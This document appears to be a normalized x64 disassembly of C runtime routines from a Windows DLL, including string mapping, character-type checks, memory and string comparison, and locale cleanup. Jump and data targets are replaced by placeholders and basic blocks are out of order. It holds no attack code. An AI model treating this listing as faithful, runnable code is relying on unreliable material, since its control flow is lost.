cmp eax 0x78
cmove r10d esi
mov [ rw-data ] r10d
mov r10d r13d
mov [ rw-data ] r13d
jmp r-xdata
mov rsi rdi
mov r12 rdi
cmp r14d edi
jne r-xdata
cmp r10d edi
je r-xdata
mov eax r9d
sub eax ecx
sub eax r13d
cmp eax r9d
jge r-xdata
add rax r13
cmp ecx edi
jne r-xdata
mov r11 [ rbp + 0x10 ]
mov edi [ rbp + 0x88 ]
test edi edi
jne r-xdata
mov rax [ rbx ]
mov r14d [ rax + 0x14 ]
mov [ rbp + 0x8 ] r14d
cmp r10d r13d
jne r-xdata
mov r9d eax
mov [ rbp + 0x70 ] eax
lea r9d [ rax + 0x1 ]
mov [ rbp + 0x70 ] r9d
jmp r-xdata
sub ecx r13d
cmp [ rax ] dil
je r-xdata
or ecx 0xffffffff
mov ecx r14d
call sub_180012ba4
mov r13d eax
cmp eax 0xffffffff
jne r-xdata
mov rax [ rbx ]
mov edi [ rax + 0x4 ]
xor eax eax
jmp r-xdata
mov r12d [ rbp + 0x88 ]
mov esi edi
cmp r12d edi
jne r-xdata
mov r15 [ rbp + 0x78 ]
mov r8 [ rbp + 0x10 ]
cmp eax edi
je r-xdata
mov rcx [ rbp + 0x18 ]
xor rcx rbp
call sub_1800042d0
mov rbx [ rbp + 0x50 ]
mov rsi [ rbp + 0x58 ]
mov rdi [ rbp + 0x60 ]
lea rsp [ rbp + 0x20 ]
pop r15
pop r14
pop r13
pop r12
pop rbp
retn
neg [ rbp + 0x90 ]
mov r8 r11
mov ecx r12d
sbb edx edx
mov [ rsp + 0x28 ] edi
mov [ rsp + 0x20 ] rdi
and edx 0x8
add edx r13d
call [ MultiByteToWideChar@IAT ]
movsxd r15 eax
cmp r15d edi
je r-xdata
mov rax [ rbx ]
mov r12d [ rax + 0x4 ]
mov eax [ rbp + 0x80 ]
mov r9d [ rbp + 0x70 ]
mov edx [ rbp ]
mov [ rsp + 0x28 ] eax
mov ecx r14d
mov [ rsp + 0x20 ] r15
call [ LCMapStringA@IAT ]
mov edi eax
xor ebx ebx
lea r9 [ rbp + 0x70 ]
mov edx eax
mov ecx edi
mov [ rsp + 0x28 ] ebx
mov [ rsp + 0x20 ] rbx
call sub_180012bf8
mov rsi rax
cmp rax rbx
je r-xdata
mov rbx 0xffffffffffffff0
mov r14d 0xdddd
mov r13d 0x400
jle r-xdata
cmp r12 rbx
je r-xdata
mov rcx rsi
call sub_180004690
mov r9d [ rbp + 0x70 ]
mov edx [ rbp ]
mov r8 rax
mov ecx r14d
mov [ rsp + 0x28 ] ebx
mov [ rsp + 0x20 ] rbx
call [ LCMapStringA@IAT ]
movsxd r9 eax
mov [ rbp + 0x4 ] r9d
cmp r9d ebx
jne r-xdata
test rdi rdi
je r-xdata
xor edx edx
lea rax [ rdx - 0x20 ]
div r15
cmp rax 0x2
jb r-xdata
mov eax edi
cmp r15 r12
je r-xdata
cmp r9d ebx
mov r14d 0xdddd
jle r-xdata
mov edi ebx
jmp r-xdata
mov r9d [ rbp + 0x70 ]
mov r8 [ rbp + 0x10 ]
mov edx 0x1
mov ecx r12d
mov [ rsp + 0x28 ] r15d
mov [ rsp + 0x20 ] rdi
call [ MultiByteToWideChar@IAT ]
xor ecx ecx
cmp eax ecx
je r-xdata
lea rcx [ r15 + r15 + 0x10 ]
cmp rcx r13
ja r-xdata
mov rcx r12
call sub_180004690
test rbx rbx
jne r-xdata
mov rcx r9
cmp r9 0xffffffffffffffe0
ja r-xdata
cmp rsi rbx
je r-xdata
lea rcx [ rdi - 0x10 ]
cmp [ rcx ] r14d
jne r-xdata
mov edx [ rbp ]
mov [ rsp + 0x28 ] ecx
mov [ rsp + 0x20 ] rcx
mov ecx [ rbp + 0x8 ]
mov r9d r15d
mov r8 rdi
call [ LCMapStringW@IAT ]
xor r8d r8d
movsxd rsi eax
cmp esi r8d
je r-xdata
call sub_180004454
mov rdi rax
test rax rax
je r-xdata
lea rax [ rcx + 0xf ]
cmp rax rcx
ja r-xdata
movsxd r8 r9d
xor edx edx
mov rcx rbx
call sub_180009540
mov r11d [ rbp + 0x4 ]
mov r9d [ rbp + 0x70 ]
mov edx [ rbp ]
mov ecx [ rbp + 0x8 ]
mov [ rsp + 0x28 ] r11d
mov r8 rsi
mov [ rsp + 0x20 ] rbx
call [ LCMapStringA@IAT ]
mov [ rbp + 0x4 ] eax
test eax eax
jne r-xdata
xor ebx ebx
jmp r-xdata
add rcx 0x10
cmp rcx 0x400
ja r-xdata
mov eax esi
jmp r-xdata
call sub_180004690
mov r10d [ rbp ]
bt r10d 0xa
jae r-xdata
mov [ rax ] r14d
and rax 0xfffffffffffffff0
call sub_180015990
sub rsp rax
lea rdi [ rsp + 0x40 ]
test rdi rdi
je r-xdata
mov rax rbx
mov eax [ rbp + 0x80 ]
lea r9 [ rbp + 0x4 ]
mov r8 rbx
mov [ rsp + 0x28 ] eax
mov edx edi
mov ecx r13d
mov [ rsp + 0x20 ] r15
call sub_180012bf8
mov edi [ rbp + 0x4 ]
mov r12 rax
xor eax eax
cmp r12 rax
cmove edi eax
xor edi edi
jmp r-xdata
call sub_180004454
mov rbx rax
test rax rax
je r-xdata
lea rbx [ rcx + 0xf ]
cmp rbx rcx
ja r-xdata
cmp esi r8d
jle r-xdata
mov eax [ rbp + 0x80 ]
cmp eax r8d
je r-xdata
mov [ rdi ] 0xcccc
jmp r-xdata
xor ebx ebx
call sub_180004690
jmp r-xdata
lea rcx [ rbx - 0x10 ]
cmp [ rcx ] r14d
jne r-xdata
mov r9d [ rbp + 0x4 ]
mov [ rax ] r14d
and rbx 0xfffffffffffffff0
mov rax rbx
call sub_180015990
sub rsp rbx
lea rbx [ rsp + 0x40 ]
test rbx rbx
je r-xdata
mov rbx 0xffffffffffffff0
mov rbx r8
xor edx edx
lea rax [ rdx - 0x20 ]
div rsi
cmp rax 0x2
jb r-xdata
cmp esi eax
jg r-xdata
add rdi 0x10
mov [ rbx ] 0xcccc
jmp r-xdata
mov ecx [ rbp + 0x8 ]
mov r9d r15d
mov r8 rdi
mov edx r10d
mov [ rsp + 0x28 ] esi
mov [ rsp + 0x20 ] rbx
call [ LCMapStringW@IAT ]
xor ecx ecx
cmp eax ecx
je r-xdata
lea rcx [ rsi + rsi + 0x10 ]
cmp rcx r13
ja r-xdata
mov ecx [ rbp + 0x8 ]
mov [ rsp + 0x28 ] eax
mov rax [ rbp + 0x78 ]
mov r9d r15d
mov r8 rdi
mov edx r10d
mov [ rsp + 0x20 ] rax
call [ LCMapStringW@IAT ]
jmp r-xdata
add rbx 0x10
lea rcx [ rbx - 0x10 ]
cmp [ rcx ] r14d
jne r-xdata
mov eax [ rbp + 0x80 ]
xor edx edx
mov [ rsp + 0x38 ] rcx
mov r9d esi
mov r8 rbx
mov [ rsp + 0x30 ] rcx
cmp eax ecx
jne r-xdata
call sub_180004454
xor r8d r8d
mov rbx rax
cmp rax r8
je r-xdata
lea rax [ rcx + 0xf ]
cmp rax rcx
ja r-xdata
call sub_180004690
mov [ rsp + 0x28 ] eax
mov rax [ rbp + 0x78 ]
mov [ rsp + 0x20 ] rax
mov [ rsp + 0x28 ] ecx
mov [ rsp + 0x20 ] rcx
jmp r-xdata
mov r10d [ rbp ]
jmp r-xdata
mov [ rax ] r14d
and rax 0xfffffffffffffff0
call sub_180015990
sub rsp rax
lea rbx [ rsp + 0x40 ]
cmp rbx r8
je r-xdata
mov rax rbx
mov ecx r12d
call [ WideCharToMultiByte@IAT ]
mov esi eax
cmp rbx r8
je r-xdata
mov [ rbx ] 0xcccc
jmp r-xdata
add rbx 0x10
sub_180011cb0
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x70
mov esi edx
mov rdx rcx
lea rcx [ rsp + 0x50 ]
mov rbx r9
mov edi r8d
call sub_180005710
mov eax [ rsp + 0xb8 ]
mov r11d [ rsp + 0xc0 ]
lea rcx [ rsp + 0x50 ]
mov [ rsp + 0x40 ] r11d
mov [ rsp + 0x38 ] eax
mov eax [ rsp + 0xb0 ]
mov [ rsp + 0x30 ] eax
mov rax [ rsp + 0xa8 ]
mov r9 rbx
mov [ rsp + 0x28 ] rax
mov eax [ rsp + 0xa0 ]
mov r8d edi
mov edx esi
mov [ rsp + 0x20 ] eax
call sub_180011770
cmp [ rsp + 0x68 ] 0x0
je r-xdata
lea r11 [ rsp + 0x70 ]
mov rbx [ r11 + 0x10 ]
mov rsi [ r11 + 0x18 ]
mov rsp r11
pop rdi
retn
mov rcx [ rsp + 0x60 ]
and [ rcx + 0xc8 ] 0xfffffffd
sub_180011d48
mov [ rsp + 0x20 ] r9d
push rbp
push r12
push r13
push r14
push r15
sub rsp 0x40
lea rbp [ rsp + 0x30 ]
mov [ rbp + 0x40 ] rbx
mov [ rbp + 0x48 ] rsi
mov [ rbp + 0x50 ] rdi
mov rax [ rw-data ]
xor rax rbp
mov [ rbp + 0x8 ] rax
mov r9d [ rw-data ]
mov edi 0x1
xor ebx ebx
mov r14 r8
mov r15d edx
mov r13 rcx
lea esi [ rdi + 0x1 ]
cmp r9d ebx
jne r-xdata
cmp r9d esi
je r-xdata
lea r9 [ rbp ]
lea rdx [ r--data ]
mov r8d edi
mov ecx edi
call [ GetStringTypeW@IAT ]
cmp eax ebx
je r-xdata
mov r12d [ rbp + 0x70 ]
mov rdi rbx
cmp r12d ebx
jne r-xdata
cmp r9d ebx
je r-xdata
call [ GetLastError@IAT ]
mov r9d [ rw-data ]
cmp eax 0x78
cmove r9d esi
mov [ rw-data ] r9d
mov [ rw-data ] edi
jmp r-xdata
mov esi [ rbp + 0x68 ]
cmp esi ebx
jne r-xdata
mov rax [ r13 ]
mov r12d [ rax + 0x14 ]
cmp r9d edi
jne r-xdata
mov esi [ rbp + 0x68 ]
cmp esi ebx
jne r-xdata
mov ecx r12d
call sub_180012ba4
cmp eax 0xffffffff
jne r-xdata
mov rax [ r13 ]
mov esi [ rax + 0x4 ]
xor eax eax
jmp r-xdata
neg [ rbp + 0x78 ]
mov r9d [ rbp + 0x58 ]
mov r8 r14
sbb edx edx
mov ecx esi
mov [ rsp + 0x28 ] ebx
and edx 0x8
mov [ rsp + 0x20 ] rbx
add edx edi
call [ MultiByteToWideChar@IAT ]
movsxd r12 eax
cmp r12d ebx
je r-xdata
mov rax [ r13 ]
mov esi [ rax + 0x4 ]
cmp eax esi
je r-xdata
mov rcx [ rbp + 0x8 ]
xor rcx rbp
call sub_1800042d0
mov rbx [ rbp + 0x40 ]
mov rsi [ rbp + 0x48 ]
mov rdi [ rbp + 0x50 ]
lea rsp [ rbp + 0x10 ]
pop r15
pop r14
pop r13
pop r12
pop rbp
retn
mov r13d 0xdddd
jle r-xdata
mov rax [ rbp + 0x60 ]
mov r9d [ rbp + 0x58 ]
mov r8 r14
mov edx r15d
mov ecx r12d
mov [ rsp + 0x20 ] rax
call [ GetStringTypeA@IAT ]
mov esi eax
cmp rdi rbx
je r-xdata
lea r9 [ rbp + 0x58 ]
mov r8 r14
mov edx eax
mov ecx esi
mov [ rsp + 0x28 ] ebx
mov [ rsp + 0x20 ] rbx
call sub_180012bf8
mov rdi rax
cmp rax rbx
je r-xdata
mov rdi rbx
mov rax 0x7ffffffffffffff0
cmp r12 rax
ja r-xdata
mov eax esi
mov rcx rdi
call sub_180004690
mov r14 rax
mov r8 r12
xor edx edx
mov rcx rdi
add r8 r8
call sub_180009540
mov r9d [ rbp + 0x58 ]
mov r8 r14
mov edx 0x1
mov ecx esi
mov [ rsp + 0x28 ] r12d
mov [ rsp + 0x20 ] rdi
call [ MultiByteToWideChar@IAT ]
cmp eax ebx
je r-xdata
lea rcx [ r12 + r12 + 0x10 ]
cmp rcx 0x400
ja r-xdata
lea rcx [ rdi - 0x10 ]
cmp [ rcx ] r13d
jne r-xdata
mov r9 [ rbp + 0x60 ]
mov r8d eax
mov rdx rdi
mov ecx r15d
call [ GetStringTypeW@IAT ]
mov ebx eax
call sub_180004454
mov rdi rax
cmp rax rbx
je r-xdata
lea rax [ rcx + 0xf ]
cmp rax rcx
ja r-xdata
mov eax ebx
jmp r-xdata
call sub_180004690
cmp rdi rbx
je r-xdata
mov [ rax ] r13d
and rax 0xfffffffffffffff0
call sub_180015990
sub rsp rax
lea rdi [ rsp + 0x30 ]
cmp rdi rbx
je r-xdata
mov rax 0xffffffffffffff0
mov [ rdi ] 0xcccc
jmp r-xdata
add rdi 0x10
jmp r-xdata
sub_180011fb4
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x60
mov esi edx
mov rdx rcx
lea rcx [ rsp + 0x40 ]
mov ebx r9d
mov rdi r8
call sub_180005710
mov eax [ rsp + 0xa0 ]
mov r11d [ rsp + 0xa8 ]
lea rcx [ rsp + 0x40 ]
mov [ rsp + 0x38 ] r11d
mov [ rsp + 0x30 ] eax
mov eax [ rsp + 0x98 ]
mov [ rsp + 0x28 ] eax
mov rax [ rsp + 0x90 ]
mov r9d ebx
mov r8 rdi
mov edx esi
mov [ rsp + 0x20 ] rax
call sub_180011d48
cmp [ rsp + 0x58 ] 0x0
je r-xdata
mov rbx [ rsp + 0x70 ]
mov rsi [ rsp + 0x78 ]
add rsp 0x60
pop rdi
retn
mov rcx [ rsp + 0x50 ]
and [ rcx + 0xc8 ] 0xfffffffd
sub_180012040
test rcx rcx
je r-xdata
retn
push rbx
sub rsp 0x20
mov rbx rcx
mov rcx [ rcx + 0x8 ]
call sub_180004690
mov rcx [ rbx + 0x10 ]
call sub_180004690
mov rcx [ rbx + 0x18 ]
call sub_180004690
mov rcx [ rbx + 0x20 ]
call sub_180004690
mov rcx [ rbx + 0x28 ]
call sub_180004690
mov rcx [ rbx + 0x30 ]
call sub_180004690
mov rcx [ rbx ]
call sub_180004690
mov rcx [ rbx + 0x40 ]
call sub_180004690
mov rcx [ rbx + 0x48 ]
call sub_180004690
mov rcx [ rbx + 0x50 ]
call sub_180004690
mov rcx [ rbx + 0x58 ]
call sub_180004690
mov rcx [ rbx + 0x60 ]
call sub_180004690
mov rcx [ rbx + 0x68 ]
call sub_180004690
mov rcx [ rbx + 0x38 ]
call sub_180004690
mov rcx [ rbx + 0x70 ]
call sub_180004690
mov rcx [ rbx + 0x78 ]
call sub_180004690
mov rcx [ rbx + 0x80 ]
call sub_180004690
mov rcx [ rbx + 0x88 ]
call sub_180004690
mov rcx [ rbx + 0x90 ]
call sub_180004690
mov rcx [ rbx + 0x98 ]
call sub_180004690
mov rcx [ rbx + 0xa0 ]
call sub_180004690
mov rcx [ rbx + 0xa8 ]
call sub_180004690
mov rcx [ rbx + 0xb0 ]
call sub_180004690
mov rcx [ rbx + 0xb8 ]
call sub_180004690
mov rcx [ rbx + 0xc0 ]
call sub_180004690
mov rcx [ rbx + 0xc8 ]
call sub_180004690
mov rcx [ rbx + 0xd0 ]
call sub_180004690
mov rcx [ rbx + 0xd8 ]
call sub_180004690
mov rcx [ rbx + 0xe0 ]
call sub_180004690
mov rcx [ rbx + 0xe8 ]
call sub_180004690
mov rcx [ rbx + 0xf0 ]
call sub_180004690
mov rcx [ rbx + 0xf8 ]
call sub_180004690
mov rcx [ rbx + 0x100 ]
call sub_180004690
mov rcx [ rbx + 0x108 ]
call sub_180004690
mov rcx [ rbx + 0x110 ]
call sub_180004690
mov rcx [ rbx + 0x118 ]
call sub_180004690
mov rcx [ rbx + 0x120 ]
call sub_180004690
mov rcx [ rbx + 0x128 ]
call sub_180004690
mov rcx [ rbx + 0x130 ]
call sub_180004690
mov rcx [ rbx + 0x138 ]
call sub_180004690
mov rcx [ rbx + 0x140 ]
call sub_180004690
mov rcx [ rbx + 0x148 ]
call sub_180004690
mov rcx [ rbx + 0x150 ]
call sub_180004690
add rsp 0x20
pop rbx
sub_18001222c
test rcx rcx
je r-xdata
retn
push rbx
sub rsp 0x20
mov rbx rcx
mov rcx [ rcx ]
cmp rcx [ rw-data ]
je r-xdata
mov rcx [ rbx + 0x8 ]
cmp rcx [ rw-data ]
je r-xdata
call sub_180004690
mov rcx [ rbx + 0x10 ]
cmp rcx [ rw-data ]
je r-xdata
call sub_180004690
add rsp 0x20
pop rbx
call sub_180004690
sub_180012274
test rcx rcx
je r-xdata
retn
push rbx
sub rsp 0x20
mov rbx rcx
mov rcx [ rcx + 0x18 ]
cmp rcx [ rw-data ]
je r-xdata
mov rcx [ rbx + 0x20 ]
cmp rcx [ rw-data ]
je r-xdata
call sub_180004690
mov rcx [ rbx + 0x28 ]
cmp rcx [ rw-data ]
je r-xdata
call sub_180004690
mov rcx [ rbx + 0x30 ]
cmp rcx [ rw-data ]
je r-xdata
call sub_180004690
mov rcx [ rbx + 0x38 ]
cmp rcx [ rw-data ]
je r-xdata
call sub_180004690
mov rcx [ rbx + 0x40 ]
cmp rcx [ rw-data ]
je r-xdata
call sub_180004690
mov rcx [ rbx + 0x48 ]
cmp rcx [ rw-data ]
je r-xdata
call sub_180004690
add rsp 0x20
pop rbx
call sub_180004690
sub_18001230c
sub rsp 0x28
call sub_1800068b0
mov rcx [ rax + 0xc0 ]
cmp rcx [ rw-data ]
je r-xdata
mov eax [ rcx + 0x4 ]
add rsp 0x28
retn
mov eax [ rax + 0xc8 ]
test [ rw-data ] eax
jne r-xdata
call sub_18000cc10
mov rcx rax
sub_180012360
sub rdx rcx
cmp r8 0x8
jb r-xdata
test r8 r8
je r-xdata
test cl 0x7
je r-xdata
xor rax rax
retn
mov al [ rcx ]
cmp al [ rdx + rcx ]
jne r-xdata
mov r9 r8
shr r9 0x3
jne r-xdata
nop
sbb eax eax
sbb eax 0xffffffff
retn
inc rcx
dec r8
jne r-xdata
shr r9 0x2
je r-xdata
inc rcx
dec r8
test cl 0x7
jne r-xdata
mov r9 r8
shr r9 0x3
je r-xdata
mov rax [ rcx ]
cmp rax [ rdx + rcx ]
jne r-xdata
mov al [ rcx ]
cmp al [ rdx + rcx ]
jne r-xdata
mov rax [ rcx ]
cmp rax [ rdx + rcx ]
jne r-xdata
mov rcx [ rcx + rdx ]
bswap rax
bswap rcx
cmp rax rcx
sbb eax eax
sbb eax 0xffffffff
retn
mov rax [ rcx + 0x8 ]
cmp rax [ rdx + rcx + 0x8 ]
jne r-xdata
add rcx 0x8
dec r9
jne r-xdata
add rcx 0x8
mov rax [ rcx + 0x10 ]
cmp rax [ rdx + rcx + 0x10 ]
jne r-xdata
and r8 0x7
jmp r-xdata
add rcx 0x8
mov rax [ rcx + 0x18 ]
cmp rax [ rdx + rcx + 0x18 ]
jne r-xdata
add rcx 0x8
add rcx 0x20
dec r9
jne r-xdata
and r8 0x1f
sub_180012440
test r8 r8
je r-xdata
xor rax rax
retn
sub rdx rcx
mov r9 rdx
mov r11 0x8101010101010100
test cl 0x7
je r-xdata
lea rdx [ rcx + r9 ]
and dx 0xfff
cmp dx 0xff8
ja r-xdata
mov al [ rcx ]
mov dl [ rcx + r9 ]
inc rcx
cmp al dl
jne r-xdata
mov rax [ rcx ]
mov rdx [ rcx + r9 ]
cmp rax rdx
jne r-xdata
sbb rax rax
sbb rax 0xffffffffffffffff
retn
dec r8
je r-xdata
add rcx 0x8
sub r8 0x8
mov r10 0x7efefefefefefeff
jbe r-xdata
test al al
je r-xdata
xor rax 0xffffffffffffffff
add r10 rdx
xor rax r10
test r11 rax
je r-xdata
test rcx 0x7
jne r-xdata
jmp r-xdata
test dl dl
je r-xdata
xor rax rax
retn
test dh dh
je r-xdata
shr rdx 0x10
test dl dl
je r-xdata
test dh dh
je r-xdata
shr rdx 0x10
test dl dl
je r-xdata
test dh dh
je r-xdata
shr edx 0x10
test dl dl
je r-xdata
test dh dh
jne r-xdata
sub_1800124f8
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x40
mov esi edx
mov rdx rcx
lea rcx [ rsp + 0x20 ]
mov ebx r9d
mov rdi r8
call sub_180005710
cmp ebx 0xffffffff
jge r-xdata
mov r9 [ rsp + 0x70 ]
mov r8d ebx
mov rdx rdi
mov ecx esi
call [ GetStringTypeW@IAT ]
xor eax eax
jmp r-xdata
mov rbx [ rsp + 0x50 ]
mov rsi [ rsp + 0x58 ]
add rsp 0x40
pop rdi
retn
mov rcx [ rsp + 0x30 ]
and [ rcx + 0xc8 ] 0xfffffffd
cmp [ rsp + 0x38 ] 0x0
je r-xdata
sub_18001255c
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x60
movsxd rdi ecx
mov ebp edx
lea rcx [ rsp + 0x40 ]
mov rdx r8
call sub_180005710
lea r11d [ rdi + 0x1 ]
cmp r11d 0x100
ja r-xdata
mov esi edi
lea rdx [ rsp + 0x40 ]
sar esi 0x8
movzx ecx sil
call sub_1800057bc
mov edx 0x1
test eax eax
je r-xdata
mov rax [ rsp + 0x40 ]
mov rcx [ rax + 0x140 ]
movzx eax [ rcx + rdi * 2 ]
jmp r-xdata
mov [ rsp + 0x88 ] dil
mov [ rsp + 0x89 ] 0x0
mov r9d edx
mov [ rsp + 0x88 ] sil
mov [ rsp + 0x89 ] dil
mov [ rsp + 0x8a ] 0x0
lea r9d [ rdx + 0x1 ]
jmp r-xdata
and eax ebp
cmp [ rsp + 0x58 ] 0x0
je r-xdata
movzx eax [ rsp + 0x70 ]
cmp [ rsp + 0x58 ] al
je r-xdata
mov rcx [ rsp + 0x40 ]
mov [ rsp + 0x38 ] edx
lea r8 [ rsp + 0x88 ]
mov eax [ rcx + 0x14 ]
mov [ rsp + 0x30 ] eax
mov eax [ rcx + 0x4 ]
lea rcx [ rsp + 0x40 ]
mov [ rsp + 0x28 ] eax
lea rax [ rsp + 0x70 ]
mov [ rsp + 0x20 ] rax
call sub_180011fb4
test eax eax
jne r-xdata
lea r11 [ rsp + 0x60 ]
mov rbp [ r11 + 0x18 ]
mov rsi [ r11 + 0x20 ]
mov rsp r11
pop rdi
retn
mov rcx [ rsp + 0x50 ]
and [ rcx + 0xc8 ] 0xfffffffd
xor eax eax
jmp r-xdata
mov rax [ rsp + 0x50 ]
and [ rax + 0xc8 ] 0xfffffffd
sub_180012668
push rbx
sub rsp 0x40
cmp [ rw-data ] 0x0
movsxd rbx ecx
jne r-xdata
lea rcx [ rsp + 0x20 ]
xor edx edx
call sub_180005710
mov rax [ rsp + 0x20 ]
cmp [ rax + 0x10c ] 0x1
jle r-xdata
mov rax [ rw-data ]
movzx eax [ rax + rbx * 2 ]
and eax 0x4
jmp r-xdata
mov rax [ rax + 0x140 ]
movzx r11d [ rax + rbx * 2 ]
and r11d 0x4
lea r8 [ rsp + 0x20 ]
mov edx 0x4
mov ecx ebx
call sub_18001255c
mov r11d eax
jmp r-xdata
add rsp 0x40
pop rbx
retn
mov eax r11d
mov rax [ rsp + 0x30 ]
and [ rax + 0xc8 ] 0xfffffffd
cmp [ rsp + 0x38 ] 0x0
je r-xdata
sub_1800126e8
push rbx
sub rsp 0x40
cmp [ rw-data ] 0x0
movsxd rbx ecx
jne r-xdata
lea rcx [ rsp + 0x20 ]
xor edx edx
call sub_180005710
mov rax [ rsp + 0x20 ]
cmp [ rax + 0x10c ] 0x1
jle r-xdata
mov rax [ rw-data ]
movzx eax [ rax + rbx * 2 ]
and eax 0x80
jmp r-xdata
mov rax [ rax + 0x140 ]
movzx r11d [ rax + rbx * 2 ]
and r11d 0x80
lea r8 [ rsp + 0x20 ]
mov edx 0x80
mov ecx ebx
call sub_18001255c
mov r11d eax
jmp r-xdata
add rsp 0x40
pop rbx
retn
mov eax r11d
mov rax [ rsp + 0x30 ]
and [ rax + 0xc8 ] 0xfffffffd
cmp [ rsp + 0x38 ] 0x0
je r-xdata
sub_18001276c
push rbx
sub rsp 0x40
cmp [ rw-data ] 0x0
movsxd rbx ecx
jne r-xdata
lea rcx [ rsp + 0x20 ]
xor edx edx
call sub_180005710
mov rax [ rsp + 0x20 ]
cmp [ rax + 0x10c ] 0x1
jle r-xdata
mov rax [ rw-data ]
movzx eax [ rax + rbx * 2 ]
and eax 0x8
jmp r-xdata
mov rax [ rax + 0x140 ]
movzx r11d [ rax + rbx * 2 ]
and r11d 0x8
lea r8 [ rsp + 0x20 ]
mov edx 0x8
mov ecx ebx
call sub_18001255c
mov r11d eax
jmp r-xdata
add rsp 0x40
pop rbx
retn
mov eax r11d
mov rax [ rsp + 0x30 ]
and [ rax + 0xc8 ] 0xfffffffd
cmp [ rsp + 0x38 ] 0x0
je r-xdata
sub_1800127ec
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x30
test [ rdx + 0x18 ] 0x40
mov rbx rdx
mov edi ecx
jne r-xdata
cmp edi 0xffffffff
je r-xdata
mov rcx rdx
call sub_180009454
lea rdx [ rw-data ]
lea r8 [ rw-data ]
movsxd r11 eax
cmp r11d 0xffffffff
je r-xdata
or eax 0xffffffff
test [ rbx + 0x18 ] 0x1
jne r-xdata
mov rcx rdx
cmp r11d 0xfffffffe
je r-xdata
cmp [ rbx + 0x10 ] 0x0
jne r-xdata
test [ rbx + 0x18 ] 0x80
je r-xdata
call sub_1800075a8
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rax ] 0x16
call sub_180008530
cmp r11d 0xffffffff
je r-xdata
mov rcx r11
mov rax r11
and ecx 0x1f
sar rax 0x5
imul rcx rcx 0x58
add rcx [ r8 + rax * 8 ]
jmp r-xdata
mov rax [ rbx ]
cmp rax [ rbx + 0x10 ]
jne r-xdata
mov rcx rbx
call sub_18000f8bc
test [ rbx + 0x18 ] 0x2
jne r-xdata
test [ rdx + 0x38 ] 0x80
je r-xdata
cmp r11d 0xfffffffe
je r-xdata
test [ rcx + 0x38 ] 0x7f
jne r-xdata
dec [ rbx ]
test [ rbx + 0x18 ] 0x40
mov rax [ rbx ]
je r-xdata
cmp [ rbx + 0x8 ] 0x0
jne r-xdata
mov rdx r11
mov rax r11
and edx 0x1f
sar rax 0x5
imul rdx rdx 0x58
add rdx [ r8 + rax * 8 ]
mov [ rax ] dil
cmp [ rax ] dil
je r-xdata
inc rax
mov [ rbx ] rax
mov rbx [ rsp + 0x40 ]
add rsp 0x30
pop rdi
retn
inc [ rbx + 0x8 ]
and [ rbx + 0x18 ] 0xffffffef
or [ rbx + 0x18 ] 0x1
movzx eax dil
jmp r-xdata
inc rax
mov [ rbx ] rax
jmp r-xdata
sub_180012908
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x40
mov ebx edx
mov rdx rcx
lea rcx [ rsp + 0x20 ]
mov edi r9d
mov esi r8d
call sub_180005710
mov rax [ rsp + 0x28 ]
movzx r11d bl
test [ r11 + rax + 0x1d ] dil
jne r-xdata
mov eax 0x1
test esi esi
je r-xdata
mov rbx [ rsp + 0x50 ]
mov rsi [ rsp + 0x58 ]
add rsp 0x40
pop rdi
retn
mov rcx [ rsp + 0x30 ]
and [ rcx + 0xc8 ] 0xfffffffd
xor eax eax
mov rax [ rsp + 0x20 ]
mov rcx [ rax + 0x140 ]
movzx eax [ rcx + r11 * 2 ]
and eax esi
jmp r-xdata
cmp [ rsp + 0x38 ] 0x0
je r-xdata
test eax eax
je r-xdata
sub_1800129a4
sub rsp 0x5a8
test [ rw-data ] 0x1
je r-xdata
call sub_18000f008
test rax rax
je r-xdata
mov ecx 0xa
call sub_180007288
test [ rw-data ] 0x2
je r-xdata
mov ecx 0x16
call sub_18000f014
mov ecx 0x3
call sub_180007060
int3
lea rcx [ rsp + 0xd0 ]
call [ RtlCaptureContext@IAT ]
lea rcx [ rsp + 0x30 ]
xor edx edx
mov r8d 0x98
call sub_180009540
mov rax [ rsp + 0x5a8 ]
xor ecx ecx
mov [ rsp + 0x40 ] rax
lea rax [ rsp + 0x30 ]
mov [ rsp + 0x30 ] 0x40000015
mov [ rsp + 0x20 ] rax
lea rax [ rsp + 0xd0 ]
mov [ rsp + 0x28 ] rax
call [ SetUnhandledExceptionFilter@IAT ]
lea rcx [ rsp + 0x20 ]
call [ UnhandledExceptionFilter@IAT ]
sub_180012a48
sub rsp 0x28
test ecx ecx
jne r-xdata
add cl 0x40
mov [ rsp + 0x31 ] 0x3a
mov [ rsp + 0x32 ] 0x5c
mov [ rsp + 0x30 ] cl
lea rcx [ rsp + 0x30 ]
mov [ rsp + 0x33 ] 0x0
call [ GetDriveTypeA@IAT ]
test eax eax
je r-xdata
mov eax 0x1
jmp r-xdata
xor eax eax
cmp eax 0x1
jne r-xdata
add rsp 0x28
retn
sub_180012a88
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
cmp [ rw-data ] 0x0
mov rbx [ rw-data ]
mov rsi rcx
je r-xdata
xor eax eax
test rbx rbx
jne r-xdata
test rsi rsi
je r-xdata
cmp [ rw-data ] rbx
je r-xdata
mov rcx rsi
call sub_18000d180
mov rdi rax
call sub_180012f98
test eax eax
jne r-xdata
call sub_18000d180
cmp rax rdi
jbe r-xdata
mov rbx [ rw-data ]
test rbx rbx
je r-xdata
add rbx 0x8
jmp r-xdata
mov rcx [ rbx ]
cmp [ rcx + rdi ] 0x3d
jne r-xdata
mov rcx [ rbx ]
test rcx rcx
je r-xdata
mov r8 rdi
mov rdx rsi
call sub_180012f90
test eax eax
je r-xdata
mov rax [ rbx ]
lea rax [ rax + rdi + 0x1 ]
jmp r-xdata
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
sub_180012b68
sub rsp 0x28
mov rcx [ rw-data ]
cmp rcx 0xffffffffffffffff
je r-xdata
mov rcx [ rw-data ]
cmp rcx 0xffffffffffffffff
je r-xdata
cmp rcx 0xfffffffffffffffe
je r-xdata
